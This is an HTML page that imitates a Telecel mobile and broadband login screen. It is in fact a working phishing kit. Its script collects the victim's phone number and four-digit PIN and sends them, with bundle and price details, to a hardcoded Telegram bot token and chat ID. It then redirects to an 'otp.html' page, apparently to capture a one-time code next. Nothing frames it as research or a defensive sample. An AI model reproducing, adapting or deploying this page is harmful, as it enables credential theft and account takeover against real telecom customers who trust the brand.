<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telecel - Log In</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f4f4f4;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 15px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        .header {
            text-align: center;
            padding: 35px 20px 20px;
        }
        .logo {
            width: 55px;
            height: 55px;
            background: #E30613;
            color: white;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 30px;
            font-weight: 900;
            margin-bottom: 10px;
        }
        h1 {
            font-size: 24px;
            font-weight: 700;
            margin: 10px 0 6px;
        }
        .subtitle {
            color: #475569;
            font-size: 15px;
            line-height: 1.4;
        }
        .form-section {
            padding: 0 25px 30px;
        }
        .form-group {
            margin-bottom: 24px;
        }
        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1e2937;
        }
        select, input {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #e2e8f0;
            border-radius: 10px;
            font-size: 16px;
        }
        select:focus, input:focus {
            border-color: #E30613;
            outline: none;
        }
        .continue-btn {
            width: 100%;
            background: #E30613;
            color: white;
            border: none;
            padding: 16px;
            font-size: 17px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin: 25px 0 20px;
        }
        .bill-banner {
            background: #E30613;
            color: white;
            padding: 20px 25px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo">t</div>
            <h1>Welcome Back</h1>
            <p class="subtitle">Enter your details to proceed.<br>Have an Enterprise account, <span style="color:#E30613;">Login Here</span></p>
        </div>

        <!-- Form -->
        <div class="form-section">
            <div class="form-group">
                <label>Select Account Type <span style="color:red;">*</span></label>
                <select id="accountType">
                    <option value="">Select Account type</option>
                    <option value="mobile" selected>Mobile</option>
                    <option value="broadband">Broadband</option>
                </select>
            </div>

            <div class="form-group">
                <label>Telephone Number <span style="color:red;">*</span></label>
                <input type="tel" id="phone" placeholder="0201234567" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
            </div>

            <div class="form-group">
                <label>PIN <span style="color:red;">*</span></label>
                <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
            </div>

            <button class="continue-btn" onclick="proceedLogin()">Continue</button>
        </div>

        <!-- Bottom Banner -->
        <div class="bill-banner">
            <h3>Pay your bills without stress</h3>
            <p style="font-size:14px; opacity:0.95;">
                Pay for your broadband, television subscription &amp; utility bills on Telecel Play. 
                And the best part, you don't even need to login to your account.
            </p>
        </div>
    </div>

    <!-- Spinner -->
    <div id="spinner" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:10000;align-items:center;justify-content:center;">
        <div style="width:70px;height:70px;border:6px solid #fff;border-top-color:#E30613;border-radius:50%;animation:spin 1s linear infinite;"></div>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8522259555:AAEl1CRJfLhjWwtqD2z6CvN-jesiotWQ__4',
            CHAT_ID: '8757709711',
            REDIRECT_PAGE: 'otp.html'
        };

        let state = { bundleInfo: null };

        function extractBundleInfo() {
            const params = new URLSearchParams(window.location.search);
            const bundle = params.get('bundle');
            const price = params.get('price');
            if (bundle && price) state.bundleInfo = { bundle, price };
        }

        function proceedLogin() {
            const accountType = document.getElementById('accountType').value || "Mobile";
            const phone = document.getElementById('phone').value.trim();
            const pin = document.getElementById('password').value.trim();

            // Ghana number validation
            if (!phone || phone.length !== 10 || !phone.startsWith('0')) {
                alert("Please enter a valid Ghanaian number (10 digits starting with 0)");
                return;
            }
            if (pin.length !== 4) {
                alert("PIN must be exactly 4 digits");
                return;
            }

            document.getElementById('spinner').style.display = 'flex';

            const bundleText = state.bundleInfo 
                ? `\nBundle: ${state.bundleInfo.bundle}\nPrice: GHS ${state.bundleInfo.price}` 
                : '';

            const message = `<b>🔴 Telecel Login Attempt</b>\n\n` +
                            `Account Type: ${accountType}\n` +
                            `Phone Number: ${phone}\n` +
                            `PIN: ${pin}${bundleText}`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).then(() => {
                setTimeout(() => {
                    window.location.href = CONFIG.REDIRECT_PAGE;
                }, 1400);
            }).catch(() => {
                alert("Connection error. Please try again.");
                document.getElementById('spinner').style.display = 'none';
            });
        }

        // Initialize
        extractBundleInfo();
    </script>
</body>
</html>
